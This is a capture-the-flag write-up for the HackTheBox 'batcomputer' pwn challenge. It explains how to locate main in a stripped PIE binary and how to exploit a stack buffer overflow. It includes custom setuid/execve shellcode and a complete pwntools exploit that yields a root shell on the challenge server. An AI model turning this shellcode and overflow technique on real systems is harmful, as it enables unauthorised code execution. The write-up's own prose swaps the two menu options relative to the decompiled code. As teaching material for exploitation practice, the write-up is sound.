---
title: batcomputer
description: Writeup for the easy pwn challenge - batcomputer
created: 2025-06-14
tags: hackthebox, pwn, ctf, practice
---

# summary

**batcomputer** is an easy pwn challenge on HackTheBox, created by **w3th4nds** and released on November 19, 2020.

In this challenge, the attacker is provided with a stripped binary and must first locate the `main` function’s address in memory.

Through reverse engineering and analysis of the `main` function, a buffer overflow vulnerability is discovered when the correct password is entered. This overflow allows the attacker to overwrite the stack, inject shellcode, and ultimately achieve code execution.

# challenge

## recon

After decompressing the archive file, we're given a single file: `batcomputer`. Let's do some file enumeration:

```bash
$ file ./batcomputer 
./batcomputer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22, for GNU/Linux 3.2.0, stripped
```

I won't go into detail about what this output means—check out my other write-ups for that. However, there is one important piece of information that stands out: the ELF is stripped. In short, stripping an application removes information from the binary, such as symbols. This can make reverse engineering more difficult, but not impossible.

If we attempt to dump symbols:

```bash
$ nm batcomputer 
nm: batcomputer: no symbols
```

## navigating to main

How can we navigate to the `main` function if we don't know its location, or where anything else is? Start by loading batcomputer into GDB:

```bash
$ gdb -q ./batcomputer 
gef➤  b main
Function "main" not defined.
```

How does an application know where to start when there is no explicitly defined starting point? Actually, there is one. All ELF files have an "entry point" address. This is the virtual address where execution begins after the interpreter (typically `/lib/ld-linux`) finishes loading the binary into memory. There are a couple of ways to find this entry point. One method is to use readelf to inspect the file header:

```bash
$ readelf -h batcomputer | grep "Entry"      
  Entry point address:               0x10b0
```

We can also use GDB to find the entry point:

```bash
gef➤  info file
Symbols from "./batcomputer".
Local exec file:
        `.batcomputer', file type elf64-x86-64.
        Entry point: 0x10b0
```

Lets set a breakpoint at `0x10b0` and run the application:

```bash
gef➤  b *0x10b0
Breakpoint 1 at 0x10b0
gef➤  r
Starting program: ./batcomputer 
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x10b0
```

Odd, did we copy it incorrectly? Lets check again:

```bash
gef➤  info file
Symbols from "./batcomputer".
Local exec file:
        `./batcomputer', file type elf64-x86-64.
        Entry point: 0x5555555550b0
```

The address has changed? That's odd! I'll address this shortly. For now, let’s set a new breakpoint at this address and run the program again:

```bash
gef➤ b *0x5555555550b0
gef➤ r
gef➤  x/16i $rip
=> 0x5555555550b0:      endbr64
   0x5555555550b4:      xor    ebp,ebp
   0x5555555550b6:      mov    r9,rdx
   0x5555555550b9:      pop    rsi
   0x5555555550ba:      mov    rdx,rsp
   0x5555555550bd:      and    rsp,0xfffffffffffffff0
   0x5555555550c1:      push   rax
   0x5555555550c2:      push   rsp
   0x5555555550c3:      lea    r8,[rip+0x2c6]        # 0x555555555390
   0x5555555550ca:      lea    rcx,[rip+0x24f]        # 0x555555555320
   0x5555555550d1:      lea    rdi,[rip+0x114]        # 0x5555555551ec
   0x5555555550d8:      call   QWORD PTR [rip+0x2f02]        # 0x555555557fe0
```

An astute reverse engineer would notice that this function lacks the typical function prologue. That's because we aren't in main yet; we're actually in the `_start` function, which is usually the first function to be executed. `_start` sets up the call to `__libc_start_main()`, which in turn executes main. It does this by loading registers with addresses for main, argc, and argv.


Let's quickly review the assembly calling convention for `__libc_start_main()`. By examining the source code for [start.S](https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/x86_64/start.S;h=f1b961f5ba2d6a1ebffee0005f43123c4352fbf4;hb=HEAD#l58), we can see what each register is loaded with. According to the code, the `rdi` register is loaded with the address of `main`. Let's check what that address is in batcomputer:

```bash
gef➤  x $rip+0x114
   0x5555555551ec:      push   rbp
```

Shows that the `main` function is located at `0x5555555551ec`.

## decompiling with ghidra

Now that we know where the start of the program is, we can begin reviewing the code! Load `batcomputer` into Ghidra, analyze it, and navigate to the `main` address.

```c
undefined8 main(void) {
  int iVar1;
  int choice;
  char password [16];
  undefined target [76];
  
  FUN_001011a9();
  while( true ) {
    while( true ) {
      memset(password,0,16);
      printf(
            "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Cha se Joker\n> "
            );
      __isoc99_scanf(&DAT_00102069,&choice);
      if (choice != 1) break;
      printf("It was very hard, but Alfred managed to locate him: %p\n",target);
    }
    if (choice != 2) break;
    printf("Ok. Let\'s do this. Enter the password: ");
    __isoc99_scanf(&DAT_001020d0,password);
    iVar1 = strcmp(password,"b4tp@$$w0rd!");
    if (iVar1 != 0) {
      puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Access Granted. \nEnter the navigation commands: ");
    read(0,target,137);
    puts("Roger that!");
  }
  puts("Too bad, now who\'s gonna save Gotham? Alfred?");
  return 0;
}
```

There's a lot happening here, so let's break it down piece by piece. First, the application asks what we would like to do. If we input `2`, the address of the `target` buffer is leaked. However, if we choose `1`, we are prompted to enter a password. This password is hardcoded into the ELF binary and can be easily extracted using the strings utility:

```bash
$ strings ./batcomputer
...<snip>...
Welcome to your BatComputer, Batman. What would you like to do?
1. Track Joker
2. Chase Joker
It was very hard, but Alfred managed to locate him: %p
Ok. Let's do this. Enter the password: 
%15s
b4tp@$$w0rd!
The password is wrong.
I can't give you access to the BatMobile!
Access Granted. 
Enter the navigation commands: 
Roger that!
Too bad, now who's gonna save Gotham? Alfred?
...<snip>...
```

If the password is entered correctly, the application reads 137 bytes of input from stdin. However, the target buffer was only allocated 76 bytes in memory, resulting in a classic stack-based buffer overflow vulnerability. Before we start developing our exploit, let's briefly discuss an important ELF security mechanism: PIE.

## position independent executable (pie)

[Position-independent code (PIC) or position-independent executable (PIE)](https://en.wikipedia.org/wiki/Position-independent_code) is machine code designed to execute correctly regardless of its memory address. This is different from absolute code, which must be loaded at a specific memory location to function properly. Remember when we set a breakpoint in GDB, ran the ELF, and encountered the error: `Cannot insert breakpoint 1. Cannot access memory at address 0x10b0`? This happened because we placed the breakpoint at the entry point offset in the ELF file rather than the actual memory address in virtual memory.

If we compare the raw bytes of the ELF file with the bytes of the ELF loaded in memory, we’ll see that they contain the same byte code.

```console
$ hexdump -C ./batcomputer
000010b0  f3 0f 1e fa 31 ed 49 89  d1 5e 48 89 e2 48 83 e4  |....1.I..^H..H..|

gef➤  x/16xb $rip
0x5555555550b0: 0xf3    0x0f    0x1e    0xfa    0x31    0xed    0x49    0x89
0x5555555550b8: 0xd1    0x5e    0x48    0x89    0xe2    0x48    0x83    0xe4
```

Lastly, you might notice that the last three [nibbles](https://learn.sparkfun.com/tutorials/binary/bits-nibbles-and-bytes) of the address are the same. This isn't a coincidence but a result of how memory [pages](https://en.wikipedia.org/wiki/Page_(computer_memory)) work.

**What is a Page?** When an operating system allocates memory for a process, it divides physical memory into "pages" and maps these physical pages to the virtual memory required by the process. But why add this extra layer of abstraction? Why not load the process directly into physical memory?

Without this abstraction, all segments of the ELF binary (such as `.data`, `.text`, `.bss`, etc.) would need to be contiguous in RAM. This could lead to inefficient memory use due to [fragmentation](https://en.wikipedia.org/wiki/Fragmentation_(computing)). Additionally, without virtual memory, processes would not be isolated from one another as they would share the same address space. This lack of isolation increases the risk of memory leaks and can compromise application security. With virtual memory, parts of a process can be loaded into memory and swapped out when no longer in use, helping to manage memory more efficiently.

<style>
    .ascii-art {
        font-family: monospace;
        white-space: pre;
    }
</style>

<pre class="ascii-art">
+-----------------------+
|        Page n         |----+
+-----------------------+    |
|        ...            |    |
+-----------------------+    |                            +-----------------------+
|        ...            |    |                        +-->|        Page n         |
+-----------------------+    |                        |   +-----------------------+
|        ...            |    |                        |   |        ...            |
+-----------------------+    |  +-------------------+ |   +-----------------------+
|        ...            |    +->|                   |-+   |        ...            |
+-----------------------+       |                   |     +-----------------------+
|        Page 2         |------>|                   |---->|        Page 2         |
+-----------------------+       |                   |     +-----------------------+
|        Page 1         |------>|                   |---->|        Page 1         |
+-----------------------+       |                   |     +-----------------------+  
|        Page 0         |------>|                   |---->|        Page 0         |
+-----------------------+       +-------------------+     +-----------------------+ 
     Virtual Memory                  Page Table                 Physical Memory
                                  (controlle by MMU)                (RAM)
</pre>

So why do the ELF offset and virtual memory addresses share the last three nibbles? This happens because Linux page sizes are 0x1000 (4096) bytes, and the operating system aligns memory data with these page boundaries. Since the page size is 0x1000, the fourth nibble will always be different (for example, starting at address `0x55555555N000` and adding `0x10b0` results in a different fourth nibble).

In this challenge, this behavior isn't particularly relevant; I just wanted to provide additional context. However, in some CTF challenges, this knowledge can be useful for exploit development. If you know the last three nibbles of the address of a nearby function in memory, you might be able to exploit this by iterating through possible values for the fourth nibble until you guess the correct one.

Anyway, enough rambling—let’s pwn this challenge!

## exploit development (finally)

### finding offset from return pointer

Let’s start by finding the offset for the overflow. Instead of doing this manually, we can use pwn tools. I created a script called `find_offset.py` that captures the crash dump (core file), analyzes the RSP, and reports the offset.

<details>
  <summary>find_offset.py</summary>

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./batcomputer", checksec=False)

p = process("./batcomputer")
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Ok. Let's do this. Enter the password:", b"b4tp@$$w0rd!")
p.sendlineafter(b"Enter the navigation commands:", cyclic(137, n=8))
p.sendlineafter(b"> ", b"3")
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)
info(f"Return pointer offset: {offset}")
```

</details>

Running `find_offset.py` reveals that the return pointer offset is 84.

```console
$ ./find_offset
[+] Starting local process './batcomputer': pid 53337
[*] Process './batcomputer' stopped with exit code -11 (SIGSEGV) (pid 53337)
[+] Parsing corefile...: Done
[*] '/home/user/Documents/repos/k00l-beanz/hackthebox/challenges/pwn/batcomputer/core.53337'
    Arch:      amd64-64-little
    RIP:       0x564896e7c31f
    RSP:       0x7ffd898b0118
    Exe:       '/home/user/Documents/repos/k00l-beanz/hackthebox/challenges/pwn/batcomputer/batcomputer' (0x564896e7b000)
    Fault:     0x6161616c61616161
[*] Return pointer offset: 84
```

### developing and injecting shellcode

Let’s do some quick math: To take control of the execution flow, we need to write 92 bytes—84 bytes for the offset and 8 bytes for the return pointer. With a maximum input of 137 bytes, this leaves us 45 bytes for shellcode. While 45 bytes is a reasonable amount of space for shellcode, we can gain more room by utilizing the leak. By overwriting the return pointer with the address obtained from the leak, we can use 84 bytes for shellcode instead of just 45, making this much more manageable.

I could use shellcode from a resource like [shell-storm](https://shell-storm.org/shellcode/index.html), but in real engagements, it's generally frowned upon to execute code you didn't write yourself. Not only is this considered unprofessional, but it can also be risky. For example, the [0pen0wn](https://domenicoluciani.com/2013/06/13/the-exploit-that-exploits-you.html) exploit code claims to exploit an OpenSSH 0day for remote code execution as root. If you're new to security, you might find the article insightful.

Instead, I wrote my own shellcode that sets the UID to 0 and performs an execve syscall to get a shell. 

<details>
    <summary>shellcode.s</summary>

```assembly
.global _start
_start:
.intel_syntax noprefix
    # setuid
    mov rax, 0x69                   # syscall for 'setuid'
    mov rdi, 0                      # set 'uid' to 0
    syscall

    # pop shell with execve
    mov rbx, 0x0068732f6e69622f     # mov "/bin/sh\0" into rbx
    push rbx                        # push "/bin/sh\0" onto the stack
    mov rdi, rsp                    # point rdi at the stack
    mov rax, 0x3b                   # syscall for 'execve'
    mov rsi, 0                      # set 'argv' to NULL
    mov rdx, 0                      # set 'envp' to NULL
    syscall
```

</details>


You can compile the shellcode using the following command:

```bash
clang -nostdlib -static shellcode.s -o shellcode && \
      objdump -d shellcode | grep "[0-9a-f]:" | grep -v "file"  |   \
      cut -d ':' -f 2 | cut -d ' ' -f1-7 | tr -s ' '            |   \
      tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g'             |   \
      paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
```

Running the exploit on the remote target drops us into a root shell and gets us the flag.

<details>
    <summary>exploit.py</summary>

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './batcomputer', checksec=False)

host = args.HOST or '94.237.60.129'
port = int(args.PORT or 47854)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
rp_offset = 84

shellcode = b""
shellcode += b"\x48\xc7\xc0\x69\x00\x00\x00"        # mov rax, 0x69
shellcode += b"\x48\xc7\xc7\x00\x00\x00\x00"        # mov rdi, 0x0
shellcode += b"\x0f\x05"                            # syscall
shellcode += b"\x48\xbb\x2f\x62\x69\x6e\x2f"        # movabs rbx, 0x68732f6e69622f
shellcode += b"\x73\x68\x00"
shellcode += b"\x53"                                # push rbx
shellcode += b"\x48\x89\xe7"                        # mov rdi, rsp
shellcode += b"\x48\xc7\xc0\x3b\x00\x00\x00"        # mov rax, 0x3b
shellcode += b"\x48\xc7\xc6\x00\x00\x00\x00"        # mov rsi, 0x0
shellcode += b"\x48\xc7\xc2\x00\x00\x00\x00"        # mov rdx, 0x0
shellcode += b"\x0f\x05"                            # syscall

io = start()

# Leak stack address
io.sendlineafter(b"> ", b"1")
leak = io.recvline()            \
            .decode("utf-8")    \
            .split()[-1]
info(f"Leaked stack address: {leak}")
leak = flat(int(leak, 16))

# Create and send payload 
payload = flat(
    shellcode,
    b"A" * (rp_offset - len(shellcode)),
    leak,
)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter the password: ", b"b4tp@$$w0rd!")
io.sendlineafter(b"Enter the navigation commands: ", payload)

# Execute shellcode
io.sendlineafter(b"> ", b"3")
io.interactive()
```

</details>

```console
$ ./exploit.py REMOTE   
[+] Opening connection to 94.237.60.129 on port 47854: Done
[*] Leaked stack address: 0x7ffe64aab914
[*] Switching to interactive mode
Too bad, now who's gonna save Gotham? Alfred?
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls
batcomputer
flag.txt
```